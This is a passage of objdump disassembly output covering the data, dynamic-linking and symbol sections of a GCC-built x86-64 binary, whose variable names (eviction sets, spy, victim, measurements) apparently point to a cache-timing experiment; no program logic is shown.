    4ae9:	00 00                	add    %al,(%rax)
    4aeb:	00 74 06 00          	add    %dh,0x0(%rsi,%rax,1)
    4aef:	00 d0                	add    %dl,%al
    4af1:	dd ff                	(bad)
    4af3:	ff                   	(bad)
    4af4:	7c 01                	jl     4af7 <__GNU_EH_FRAME_HDR+0x8d7>
    4af6:	00 00                	add    %al,(%rax)
    4af8:	00 41 0e             	add    %al,0xe(%rcx)
    4afb:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4b01:	45 83 03 03          	rex.RB addl $0x3,(%r11)
    4b05:	72 01                	jb     4b08 <__GNU_EH_FRAME_HDR+0x8e8>
    4b07:	0c 07                	or     $0x7,%al
    4b09:	08 00                	or     %al,(%rax)
    4b0b:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4b0e:	00 00                	add    %al,(%rax)
    4b10:	98                   	cwtl
    4b11:	06                   	(bad)
    4b12:	00 00                	add    %al,(%rax)
    4b14:	28 df                	sub    %bl,%bh
    4b16:	ff                   	(bad)
    4b17:	ff 58 00             	lcall  *0x0(%rax)
    4b1a:	00 00                	add    %al,(%rax)
    4b1c:	00 41 0e             	add    %al,0xe(%rcx)
    4b1f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4b25:	02 53 0c             	add    0xc(%rbx),%dl
    4b28:	07                   	(bad)
    4b29:	08 00                	or     %al,(%rax)
    4b2b:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4b2e:	00 00                	add    %al,(%rax)
    4b30:	b8 06 00 00 60       	mov    $0x60000006,%eax
    4b35:	df ff                	(bad)
    4b37:	ff                   	(bad)
    4b38:	bd 00 00 00 00       	mov    $0x0,%ebp
    4b3d:	41 0e                	rex.B (bad)
    4b3f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4b45:	02 b8 0c 07 08 00    	add    0x8070c(%rax),%bh
    4b4b:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4b4e:	00 00                	add    %al,(%rax)
    4b50:	d8 06                	fadds  (%rsi)
    4b52:	00 00                	add    %al,(%rax)
    4b54:	fd                   	std
    4b55:	df ff                	(bad)
    4b57:	ff 75 00             	push   0x0(%rbp)
    4b5a:	00 00                	add    %al,(%rax)
    4b5c:	00 41 0e             	add    %al,0xe(%rcx)
    4b5f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4b65:	02 70 0c             	add    0xc(%rax),%dh
    4b68:	07                   	(bad)
    4b69:	08 00                	or     %al,(%rax)
    4b6b:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4b6e:	00 00                	add    %al,(%rax)
    4b70:	f8                   	clc
    4b71:	06                   	(bad)
    4b72:	00 00                	add    %al,(%rax)
    4b74:	52                   	push   %rdx
    4b75:	e0 ff                	loopne 4b76 <__GNU_EH_FRAME_HDR+0x956>
    4b77:	ff 62 00             	jmp    *0x0(%rdx)
    4b7a:	00 00                	add    %al,(%rax)
    4b7c:	00 41 0e             	add    %al,0xe(%rcx)
    4b7f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4b85:	02 5d 0c             	add    0xc(%rbp),%bl
    4b88:	07                   	(bad)
    4b89:	08 00                	or     %al,(%rax)
    4b8b:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4b8e:	00 00                	add    %al,(%rax)
    4b90:	18 07                	sbb    %al,(%rdi)
    4b92:	00 00                	add    %al,(%rax)
    4b94:	94                   	xchg   %eax,%esp
    4b95:	e0 ff                	loopne 4b96 <__GNU_EH_FRAME_HDR+0x976>
    4b97:	ff cd                	dec    %ebp
    4b99:	00 00                	add    %al,(%rax)
    4b9b:	00 00                	add    %al,(%rax)
    4b9d:	41 0e                	rex.B (bad)
    4b9f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4ba5:	02 c8                	add    %al,%cl
    4ba7:	0c 07                	or     $0x7,%al
    4ba9:	08 00                	or     %al,(%rax)
    4bab:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4bae:	00 00                	add    %al,(%rax)
    4bb0:	38 07                	cmp    %al,(%rdi)
    4bb2:	00 00                	add    %al,(%rax)
    4bb4:	41 e1 ff             	rex.B loope 4bb6 <__GNU_EH_FRAME_HDR+0x996>
    4bb7:	ff 25 01 00 00 00    	jmp    *0x1(%rip)        # 4bbe <__GNU_EH_FRAME_HDR+0x99e>
    4bbd:	41 0e                	rex.B (bad)
    4bbf:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4bc5:	03 20                	add    (%rax),%esp
    4bc7:	01 0c 07             	add    %ecx,(%rdi,%rax,1)
    4bca:	08 00                	or     %al,(%rax)
    4bcc:	1c 00                	sbb    $0x0,%al
    4bce:	00 00                	add    %al,(%rax)
    4bd0:	58                   	pop    %rax
    4bd1:	07                   	(bad)
    4bd2:	00 00                	add    %al,(%rax)
    4bd4:	46 e2 ff             	rex.RX loop 4bd6 <__GNU_EH_FRAME_HDR+0x9b6>
    4bd7:	ff 9b 00 00 00 00    	lcall  *0x0(%rbx)
    4bdd:	41 0e                	rex.B (bad)
    4bdf:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4be5:	02 96 0c 07 08 00    	add    0x8070c(%rsi),%dl
    4beb:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4bee:	00 00                	add    %al,(%rax)
    4bf0:	78 07                	js     4bf9 <__GNU_EH_FRAME_HDR+0x9d9>
    4bf2:	00 00                	add    %al,(%rax)
    4bf4:	c1 e2 ff             	shl    $0xff,%edx
    4bf7:	ff 16                	call   *(%rsi)
    4bf9:	01 00                	add    %eax,(%rax)
    4bfb:	00 00                	add    %al,(%rax)
    4bfd:	41 0e                	rex.B (bad)
    4bff:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4c05:	03 11                	add    (%rcx),%edx
    4c07:	01 0c 07             	add    %ecx,(%rdi,%rax,1)
    4c0a:	08 00                	or     %al,(%rax)
    4c0c:	1c 00                	sbb    $0x0,%al
    4c0e:	00 00                	add    %al,(%rax)
    4c10:	98                   	cwtl
    4c11:	07                   	(bad)
    4c12:	00 00                	add    %al,(%rax)
    4c14:	b7 e3                	mov    $0xe3,%bh
    4c16:	ff                   	(bad)
    4c17:	ff 1f                	lcall  *(%rdi)
    4c19:	02 00                	add    (%rax),%al
    4c1b:	00 00                	add    %al,(%rax)
    4c1d:	41 0e                	rex.B (bad)
    4c1f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4c25:	03 1a                	add    (%rdx),%ebx
    4c27:	02 0c 07             	add    (%rdi,%rax,1),%cl
    4c2a:	08 00                	or     %al,(%rax)
    4c2c:	1c 00                	sbb    $0x0,%al
    4c2e:	00 00                	add    %al,(%rax)
    4c30:	b8 07 00 00 b6       	mov    $0xb6000007,%eax
    4c35:	e5 ff                	in     $0xff,%eax
    4c37:	ff 35 00 00 00 00    	push   0x0(%rip)        # 4c3d <__GNU_EH_FRAME_HDR+0xa1d>
    4c3d:	41 0e                	rex.B (bad)
    4c3f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4c45:	70 0c                	jo     4c53 <__GNU_EH_FRAME_HDR+0xa33>
    4c47:	07                   	(bad)
    4c48:	08 00                	or     %al,(%rax)
    4c4a:	00 00                	add    %al,(%rax)
    4c4c:	1c 00                	sbb    $0x0,%al
    4c4e:	00 00                	add    %al,(%rax)
    4c50:	d8 07                	fadds  (%rdi)
    4c52:	00 00                	add    %al,(%rax)
    4c54:	cb                   	lret
    4c55:	e5 ff                	in     $0xff,%eax
    4c57:	ff 20                	jmp    *(%rax)
    4c59:	00 00                	add    %al,(%rax)
    4c5b:	00 00                	add    %al,(%rax)
    4c5d:	41 0e                	rex.B (bad)
    4c5f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4c65:	5b                   	pop    %rbx
    4c66:	0c 07                	or     $0x7,%al
    4c68:	08 00                	or     %al,(%rax)
    4c6a:	00 00                	add    %al,(%rax)
    4c6c:	1c 00                	sbb    $0x0,%al
    4c6e:	00 00                	add    %al,(%rax)
    4c70:	f8                   	clc
    4c71:	07                   	(bad)
    4c72:	00 00                	add    %al,(%rax)
    4c74:	cb                   	lret
    4c75:	e5 ff                	in     $0xff,%eax
    4c77:	ff                   	(bad)
    4c78:	78 00                	js     4c7a <__GNU_EH_FRAME_HDR+0xa5a>
    4c7a:	00 00                	add    %al,(%rax)
    4c7c:	00 41 0e             	add    %al,0xe(%rcx)
    4c7f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4c85:	02 73 0c             	add    0xc(%rbx),%dh
    4c88:	07                   	(bad)
    4c89:	08 00                	or     %al,(%rax)
    4c8b:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4c8e:	00 00                	add    %al,(%rax)
    4c90:	18 08                	sbb    %cl,(%rax)
    4c92:	00 00                	add    %al,(%rax)
    4c94:	23 e6                	and    %esi,%esp
    4c96:	ff                   	(bad)
    4c97:	ff 57 00             	call   *0x0(%rdi)
    4c9a:	00 00                	add    %al,(%rax)
    4c9c:	00 41 0e             	add    %al,0xe(%rcx)
    4c9f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4ca5:	02 52 0c             	add    0xc(%rdx),%dl
    4ca8:	07                   	(bad)
    4ca9:	08 00                	or     %al,(%rax)
    4cab:	00 20                	add    %ah,(%rax)
    4cad:	00 00                	add    %al,(%rax)
    4caf:	00 38                	add    %bh,(%rax)
    4cb1:	08 00                	or     %al,(%rax)
    4cb3:	00 5a e6             	add    %bl,-0x1a(%rdx)
    4cb6:	ff                   	(bad)
    4cb7:	ff a1 00 00 00 00    	jmp    *0x0(%rcx)
    4cbd:	41 0e                	rex.B (bad)
    4cbf:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4cc5:	45 83 03 02          	rex.RB addl $0x2,(%r11)
    4cc9:	97                   	xchg   %eax,%edi
    4cca:	0c 07                	or     $0x7,%al
    4ccc:	08 00                	or     %al,(%rax)
    4cce:	00 00                	add    %al,(%rax)
    4cd0:	1c 00                	sbb    $0x0,%al
    4cd2:	00 00                	add    %al,(%rax)
    4cd4:	5c                   	pop    %rsp
    4cd5:	08 00                	or     %al,(%rax)
    4cd7:	00 d7                	add    %dl,%bh
    4cd9:	e6 ff                	out    %al,$0xff
    4cdb:	ff 5d 00             	lcall  *0x0(%rbp)
    4cde:	00 00                	add    %al,(%rax)
    4ce0:	00 41 0e             	add    %al,0xe(%rcx)
    4ce3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    4ce9:	02 58 0c             	add    0xc(%rax),%bl
    4cec:	07                   	(bad)
    4ced:	08 00                	or     %al,(%rax)
	...

0000000000004cf0 <__FRAME_END__>:
    4cf0:	00 00                	add    %al,(%rax)
	...

Disassembly of section .init_array:

0000000000005dd0 <__frame_dummy_init_array_entry>:
    5dd0:	70 12                	jo     5de4 <_DYNAMIC+0x4>
    5dd2:	00 00                	add    %al,(%rax)
    5dd4:	00 00                	add    %al,(%rax)
	...

Disassembly of section .fini_array:

0000000000005dd8 <__do_global_dtors_aux_fini_array_entry>:
    5dd8:	30 12                	xor    %dl,(%rdx)
    5dda:	00 00                	add    %al,(%rax)
    5ddc:	00 00                	add    %al,(%rax)
	...

Disassembly of section .dynamic:

0000000000005de0 <_DYNAMIC>:
    5de0:	01 00                	add    %eax,(%rax)
    5de2:	00 00                	add    %al,(%rax)
    5de4:	00 00                	add    %al,(%rax)
    5de6:	00 00                	add    %al,(%rax)
    5de8:	a3 00 00 00 00 00 00 	movabs %eax,0xc00000000000000
    5def:	00 0c 
	...
    5df9:	10 00                	adc    %al,(%rax)
    5dfb:	00 00                	add    %al,(%rax)
    5dfd:	00 00                	add    %al,(%rax)
    5dff:	00 0d 00 00 00 00    	add    %cl,0x0(%rip)        # 5e05 <_DYNAMIC+0x25>
    5e05:	00 00                	add    %al,(%rax)
    5e07:	00 0c 34             	add    %cl,(%rsp,%rsi,1)
    5e0a:	00 00                	add    %al,(%rax)
    5e0c:	00 00                	add    %al,(%rax)
    5e0e:	00 00                	add    %al,(%rax)
    5e10:	19 00                	sbb    %eax,(%rax)
    5e12:	00 00                	add    %al,(%rax)
    5e14:	00 00                	add    %al,(%rax)
    5e16:	00 00                	add    %al,(%rax)
    5e18:	d0 5d 00             	rcrb   0x0(%rbp)
    5e1b:	00 00                	add    %al,(%rax)
    5e1d:	00 00                	add    %al,(%rax)
    5e1f:	00 1b                	add    %bl,(%rbx)
    5e21:	00 00                	add    %al,(%rax)
    5e23:	00 00                	add    %al,(%rax)
    5e25:	00 00                	add    %al,(%rax)
    5e27:	00 08                	add    %cl,(%rax)
    5e29:	00 00                	add    %al,(%rax)
    5e2b:	00 00                	add    %al,(%rax)
    5e2d:	00 00                	add    %al,(%rax)
    5e2f:	00 1a                	add    %bl,(%rdx)
    5e31:	00 00                	add    %al,(%rax)
    5e33:	00 00                	add    %al,(%rax)
    5e35:	00 00                	add    %al,(%rax)
    5e37:	00 d8                	add    %bl,%al
    5e39:	5d                   	pop    %rbp
    5e3a:	00 00                	add    %al,(%rax)
    5e3c:	00 00                	add    %al,(%rax)
    5e3e:	00 00                	add    %al,(%rax)
    5e40:	1c 00                	sbb    $0x0,%al
    5e42:	00 00                	add    %al,(%rax)
    5e44:	00 00                	add    %al,(%rax)
    5e46:	00 00                	add    %al,(%rax)
    5e48:	08 00                	or     %al,(%rax)
    5e4a:	00 00                	add    %al,(%rax)
    5e4c:	00 00                	add    %al,(%rax)
    5e4e:	00 00                	add    %al,(%rax)
    5e50:	f5                   	cmc
    5e51:	fe                   	(bad)
    5e52:	ff 6f 00             	ljmp   *0x0(%rdi)
    5e55:	00 00                	add    %al,(%rax)
    5e57:	00 a0 03 00 00 00    	add    %ah,0x3(%rax)
    5e5d:	00 00                	add    %al,(%rax)
    5e5f:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 5e65 <_DYNAMIC+0x85>
    5e65:	00 00                	add    %al,(%rax)
    5e67:	00 50 06             	add    %dl,0x6(%rax)
    5e6a:	00 00                	add    %al,(%rax)
    5e6c:	00 00                	add    %al,(%rax)
    5e6e:	00 00                	add    %al,(%rax)
    5e70:	06                   	(bad)
    5e71:	00 00                	add    %al,(%rax)
    5e73:	00 00                	add    %al,(%rax)
    5e75:	00 00                	add    %al,(%rax)
    5e77:	00 c8                	add    %cl,%al
    5e79:	03 00                	add    (%rax),%eax
    5e7b:	00 00                	add    %al,(%rax)
    5e7d:	00 00                	add    %al,(%rax)
    5e7f:	00 0a                	add    %cl,(%rdx)
    5e81:	00 00                	add    %al,(%rax)
    5e83:	00 00                	add    %al,(%rax)
    5e85:	00 00                	add    %al,(%rax)
    5e87:	00 14 01             	add    %dl,(%rcx,%rax,1)
    5e8a:	00 00                	add    %al,(%rax)
    5e8c:	00 00                	add    %al,(%rax)
    5e8e:	00 00                	add    %al,(%rax)
    5e90:	0b 00                	or     (%rax),%eax
    5e92:	00 00                	add    %al,(%rax)
    5e94:	00 00                	add    %al,(%rax)
    5e96:	00 00                	add    %al,(%rax)
    5e98:	18 00                	sbb    %al,(%rax)
    5e9a:	00 00                	add    %al,(%rax)
    5e9c:	00 00                	add    %al,(%rax)
    5e9e:	00 00                	add    %al,(%rax)
    5ea0:	15 00 00 00 00       	adc    $0x0,%eax
	...
    5ead:	00 00                	add    %al,(%rax)
    5eaf:	00 03                	add    %al,(%rbx)
    5eb1:	00 00                	add    %al,(%rax)
    5eb3:	00 00                	add    %al,(%rax)
    5eb5:	00 00                	add    %al,(%rax)
    5eb7:	00 e8                	add    %ch,%al
    5eb9:	5f                   	pop    %rdi
    5eba:	00 00                	add    %al,(%rax)
    5ebc:	00 00                	add    %al,(%rax)
    5ebe:	00 00                	add    %al,(%rax)
    5ec0:	02 00                	add    (%rax),%al
    5ec2:	00 00                	add    %al,(%rax)
    5ec4:	00 00                	add    %al,(%rax)
    5ec6:	00 00                	add    %al,(%rax)
    5ec8:	f8                   	clc
    5ec9:	01 00                	add    %eax,(%rax)
    5ecb:	00 00                	add    %al,(%rax)
    5ecd:	00 00                	add    %al,(%rax)
    5ecf:	00 14 00             	add    %dl,(%rax,%rax,1)
    5ed2:	00 00                	add    %al,(%rax)
    5ed4:	00 00                	add    %al,(%rax)
    5ed6:	00 00                	add    %al,(%rax)
    5ed8:	07                   	(bad)
    5ed9:	00 00                	add    %al,(%rax)
    5edb:	00 00                	add    %al,(%rax)
    5edd:	00 00                	add    %al,(%rax)
    5edf:	00 17                	add    %dl,(%rdi)
    5ee1:	00 00                	add    %al,(%rax)
    5ee3:	00 00                	add    %al,(%rax)
    5ee5:	00 00                	add    %al,(%rax)
    5ee7:	00 a0 08 00 00 00    	add    %ah,0x8(%rax)
    5eed:	00 00                	add    %al,(%rax)
    5eef:	00 07                	add    %al,(%rdi)
    5ef1:	00 00                	add    %al,(%rax)
    5ef3:	00 00                	add    %al,(%rax)
    5ef5:	00 00                	add    %al,(%rax)
    5ef7:	00 e0                	add    %ah,%al
    5ef9:	07                   	(bad)
    5efa:	00 00                	add    %al,(%rax)
    5efc:	00 00                	add    %al,(%rax)
    5efe:	00 00                	add    %al,(%rax)
    5f00:	08 00                	or     %al,(%rax)
    5f02:	00 00                	add    %al,(%rax)
    5f04:	00 00                	add    %al,(%rax)
    5f06:	00 00                	add    %al,(%rax)
    5f08:	c0 00 00             	rolb   $0x0,(%rax)
    5f0b:	00 00                	add    %al,(%rax)
    5f0d:	00 00                	add    %al,(%rax)
    5f0f:	00 09                	add    %cl,(%rcx)
    5f11:	00 00                	add    %al,(%rax)
    5f13:	00 00                	add    %al,(%rax)
    5f15:	00 00                	add    %al,(%rax)
    5f17:	00 18                	add    %bl,(%rax)
    5f19:	00 00                	add    %al,(%rax)
    5f1b:	00 00                	add    %al,(%rax)
    5f1d:	00 00                	add    %al,(%rax)
    5f1f:	00 fb                	add    %bh,%bl
    5f21:	ff                   	(bad)
    5f22:	ff 6f 00             	ljmp   *0x0(%rdi)
    5f25:	00 00                	add    %al,(%rax)
    5f27:	00 00                	add    %al,(%rax)
    5f29:	00 00                	add    %al,(%rax)
    5f2b:	08 00                	or     %al,(%rax)
    5f2d:	00 00                	add    %al,(%rax)
    5f2f:	00 fe                	add    %bh,%dh
    5f31:	ff                   	(bad)
    5f32:	ff 6f 00             	ljmp   *0x0(%rdi)
    5f35:	00 00                	add    %al,(%rax)
    5f37:	00 a0 07 00 00 00    	add    %ah,0x7(%rax)
    5f3d:	00 00                	add    %al,(%rax)
    5f3f:	00 ff                	add    %bh,%bh
    5f41:	ff                   	(bad)
    5f42:	ff 6f 00             	ljmp   *0x0(%rdi)
    5f45:	00 00                	add    %al,(%rax)
    5f47:	00 01                	add    %al,(%rcx)
    5f49:	00 00                	add    %al,(%rax)
    5f4b:	00 00                	add    %al,(%rax)
    5f4d:	00 00                	add    %al,(%rax)
    5f4f:	00 f0                	add    %dh,%al
    5f51:	ff                   	(bad)
    5f52:	ff 6f 00             	ljmp   *0x0(%rdi)
    5f55:	00 00                	add    %al,(%rax)
    5f57:	00 64 07 00          	add    %ah,0x0(%rdi,%rax,1)
    5f5b:	00 00                	add    %al,(%rax)
    5f5d:	00 00                	add    %al,(%rax)
    5f5f:	00 f9                	add    %bh,%cl
    5f61:	ff                   	(bad)
    5f62:	ff 6f 00             	ljmp   *0x0(%rdi)
    5f65:	00 00                	add    %al,(%rax)
    5f67:	00 03                	add    %al,(%rbx)
	...

Disassembly of section .got:

0000000000005fc0 <.got>:
	...

Disassembly of section .got.plt:

0000000000005fe8 <_GLOBAL_OFFSET_TABLE_>:
    5fe8:	e0 5d                	loopne 6047 <_GLOBAL_OFFSET_TABLE_+0x5f>
	...
    5ffe:	00 00                	add    %al,(%rax)
    6000:	36 10 00             	ss adc %al,(%rax)
    6003:	00 00                	add    %al,(%rax)
    6005:	00 00                	add    %al,(%rax)
    6007:	00 46 10             	add    %al,0x10(%rsi)
    600a:	00 00                	add    %al,(%rax)
    600c:	00 00                	add    %al,(%rax)
    600e:	00 00                	add    %al,(%rax)
    6010:	56                   	push   %rsi
    6011:	10 00                	adc    %al,(%rax)
    6013:	00 00                	add    %al,(%rax)
    6015:	00 00                	add    %al,(%rax)
    6017:	00 66 10             	add    %ah,0x10(%rsi)
    601a:	00 00                	add    %al,(%rax)
    601c:	00 00                	add    %al,(%rax)
    601e:	00 00                	add    %al,(%rax)
    6020:	76 10                	jbe    6032 <_GLOBAL_OFFSET_TABLE_+0x4a>
    6022:	00 00                	add    %al,(%rax)
    6024:	00 00                	add    %al,(%rax)
    6026:	00 00                	add    %al,(%rax)
    6028:	86 10                	xchg   %dl,(%rax)
    602a:	00 00                	add    %al,(%rax)
    602c:	00 00                	add    %al,(%rax)
    602e:	00 00                	add    %al,(%rax)
    6030:	96                   	xchg   %eax,%esi
    6031:	10 00                	adc    %al,(%rax)
    6033:	00 00                	add    %al,(%rax)
    6035:	00 00                	add    %al,(%rax)
    6037:	00 a6 10 00 00 00    	add    %ah,0x10(%rsi)
    603d:	00 00                	add    %al,(%rax)
    603f:	00 b6 10 00 00 00    	add    %dh,0x10(%rsi)
    6045:	00 00                	add    %al,(%rax)
    6047:	00 c6                	add    %al,%dh
    6049:	10 00                	adc    %al,(%rax)
    604b:	00 00                	add    %al,(%rax)
    604d:	00 00                	add    %al,(%rax)
    604f:	00 d6                	add    %dl,%dh
    6051:	10 00                	adc    %al,(%rax)
    6053:	00 00                	add    %al,(%rax)
    6055:	00 00                	add    %al,(%rax)
    6057:	00 e6                	add    %ah,%dh
    6059:	10 00                	adc    %al,(%rax)
    605b:	00 00                	add    %al,(%rax)
    605d:	00 00                	add    %al,(%rax)
    605f:	00 f6                	add    %dh,%dh
    6061:	10 00                	adc    %al,(%rax)
    6063:	00 00                	add    %al,(%rax)
    6065:	00 00                	add    %al,(%rax)
    6067:	00 06                	add    %al,(%rsi)
    6069:	11 00                	adc    %eax,(%rax)
    606b:	00 00                	add    %al,(%rax)
    606d:	00 00                	add    %al,(%rax)
    606f:	00 16                	add    %dl,(%rsi)
    6071:	11 00                	adc    %eax,(%rax)
    6073:	00 00                	add    %al,(%rax)
    6075:	00 00                	add    %al,(%rax)
    6077:	00 26                	add    %ah,(%rsi)
    6079:	11 00                	adc    %eax,(%rax)
    607b:	00 00                	add    %al,(%rax)
    607d:	00 00                	add    %al,(%rax)
    607f:	00 36                	add    %dh,(%rsi)
    6081:	11 00                	adc    %eax,(%rax)
    6083:	00 00                	add    %al,(%rax)
    6085:	00 00                	add    %al,(%rax)
    6087:	00 46 11             	add    %al,0x11(%rsi)
    608a:	00 00                	add    %al,(%rax)
    608c:	00 00                	add    %al,(%rax)
    608e:	00 00                	add    %al,(%rax)
    6090:	56                   	push   %rsi
    6091:	11 00                	adc    %eax,(%rax)
    6093:	00 00                	add    %al,(%rax)
    6095:	00 00                	add    %al,(%rax)
    6097:	00 66 11             	add    %ah,0x11(%rsi)
    609a:	00 00                	add    %al,(%rax)
    609c:	00 00                	add    %al,(%rax)
    609e:	00 00                	add    %al,(%rax)
    60a0:	76 11                	jbe    60b3 <__dso_handle+0x3>
    60a2:	00 00                	add    %al,(%rax)
    60a4:	00 00                	add    %al,(%rax)
	...

Disassembly of section .data:

00000000000060a8 <__data_start>:
	...

00000000000060b0 <__dso_handle>:
    60b0:	b0 60                	mov    $0x60,%al
    60b2:	00 00                	add    %al,(%rax)
    60b4:	00 00                	add    %al,(%rax)
	...

Disassembly of section .bss:

00000000000060b8 <completed.0>:
	...

00000000000060c0 <conf>:
	...

00000000000060c8 <evsets>:
	...

00000000000060d0 <buffer>:
	...

00000000000060d8 <buffer_size>:
	...

00000000000060e0 <buffer_ptr>:
	...

00000000000060e8 <lfsr>:
	...

00000000000060f0 <msr_index>:
	...

00000000000060f8 <msrmts>:
	...

0000000000006100 <threshold>:
	...

0000000000006108 <spy_evsets>:
	...

0000000000006110 <victim>:
	...

0000000000006118 <map_len>:
	...

0000000000006120 <conf>:
	...

0000000000006128 <evsets>:
	...

0000000000006130 <buffer>:
	...

0000000000006138 <buffer_size>:
	...

0000000000006140 <buffer_ptr>:
	...

0000000000006148 <lfsr>:
	...

0000000000006150 <msr_index>:
	...

0000000000006158 <msrmts>:
	...

0000000000006160 <threshold>:
	...

Disassembly of section .comment:

0000000000000000 <.comment>:
   0:	47                   	rex.RXB
   1:	43                   	rex.XB
   2:	43 3a 20             	rex.XB cmp (%r8),%spl
   5:	28 44 65 62          	sub    %al,0x62(%rbp,%riz,2)
   9:	69 61 6e 20 31 32 2e 	imul   $0x2e323120,0x6e(%rcx),%esp
  10:	32 2e                	xor    (%rsi),%ch
  12:	30 2d 31 34 29 20    	xor    %ch,0x20293431(%rip)        # 20293449 <_end+0x2028d2e1>
  18:	31 32                	xor    %esi,(%rdx)
  1a:	2e 32 2e             	cs xor (%rsi),%ch
  1d:	30 00                	xor    %al,(%rax)
